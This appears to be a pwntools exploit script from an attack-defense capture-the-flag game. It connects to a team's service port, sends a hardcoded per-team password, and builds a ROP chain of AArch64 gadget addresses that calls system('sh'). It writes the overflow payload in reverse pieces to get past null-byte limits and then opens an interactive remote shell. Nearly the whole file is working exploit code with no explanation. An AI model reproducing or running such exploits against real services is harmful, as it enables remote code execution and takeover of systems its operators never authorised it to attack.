from pwn import *
import sys

team = int(sys.argv[2])
p = remote(sys.argv[1], 5000 + team)

greeting = 0x493018
pop_x19 = 0x400790
mov_x0_x19 = 0x400788
system = 0x400e38
fill = 0x4141414141414141

if team == 0:
	p.send("letmeinplz\n")
elif team == 1:
	p.send("letmein181\n")
elif team == 2:
	p.send("letmein244\n")
elif team == 3:
	p.send("letmein364\n")
elif team == 4:
	p.send("letmein474\n")

rop = p64(pop_x19) + "A"*0x100
rop += p64(fill) + p64(mov_x0_x19) + p64(greeting) + p64(fill) + p64(fill) + p64(fill) + p64(fill) + "A"*0x68
rop += p64(fill) + p64(system)

cmd = "sh\x00"
payload = cmd + "A" * (0x110 - len(cmd)) + rop

while len(payload) > 0:
	p.send("3\n")
	p.send(payload.replace('\x00', 'A') + "\n")
	zero = payload.rfind('\x00')
	if zero == -1:
		break
	payload = payload[0:zero]

p.send("5\n")

p.interactive()

